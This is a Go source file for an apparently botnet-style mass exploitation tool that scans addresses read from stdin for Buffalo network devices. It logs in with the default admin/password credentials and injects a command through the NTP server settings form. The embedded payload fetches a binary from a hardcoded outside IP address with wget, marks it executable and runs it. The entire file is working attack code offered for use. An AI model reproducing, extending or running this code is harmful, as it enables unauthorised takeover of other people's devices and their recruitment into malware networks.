package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
	"io"
	"bytes"
	"strconv"
)

var (
	port = os.Args[1]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	payload = "$(cd+/tmp;wget+http://94.156.68.152/ah;chmod+777+ah;./ah+buffalo)"
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: httpd")
}

func logoutDevice(target string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /logout.html HTTP/1.1\r\nCookie: mobile=false\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func getsessionLogin(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /login.html HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "name=\"nosave_session_num\" value=\"") {

		sessionStr := strings.Split(buff.String(), "name=\"nosave_session_num\" value=\"")

		if len(sessionStr) > 1 {
			session := strings.Split(sessionStr[1], "\"")

			if len(session) > 0 {
				return session[0]
			}
		}
	}

	return ""
}


func loginDevice(target, session string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "nosave_Username=admin&nosave_Password=password&MobileDevice=0&nosave_session_num=" + session
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /login.html HTTP/1.1\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: http://" + target + "\r\nCookie: mobile=false\r\nReferer: http://" + target + "/login.html\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36r\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "index.html") && strings.Contains(buff.String(), "BUFFALO")
}

func getSession(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /ntp.html HTTP/1.1\r\nReferer: http://" + target + "/ntp.html\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "name=\"nosave_session_num\" value=\"") {

		sessionStr := strings.Split(buff.String(), "name=\"nosave_session_num\" value=\"")

		if len(sessionStr) > 1 {
			session := strings.Split(sessionStr[1], "\"")

			if len(session) > 0 {
				return session[0]
			}
		}
	}

	return ""
}

func sendPayload(target, session string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "NTPEnable=1&NTPDefServer1=" + payload + "&NTPSyncInterval=86400&nosave_session_num=" + session
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /ntp.html HTTP/1.1\r\nConnection: close\r\nOrigin: http://" + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: mobile=false\r\nReferer: http://" + target + "/ntp.html\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "ntp.html")
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	loginSession := getsessionLogin(target)

	if loginSession == "" {
		return
	}

	if !loginDevice(target, loginSession) {
		return
	}

	fmt.Printf("[BUFFALO] logged in to %s (%s)\n", target, loginSession)

	session := getSession(target)

	if session == "" {
		return
	}

	if !sendPayload(target, session) {
		return
	}

	fmt.Printf("[BUFFALO] %s send payload\n", target)
	logoutDevice(target)
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
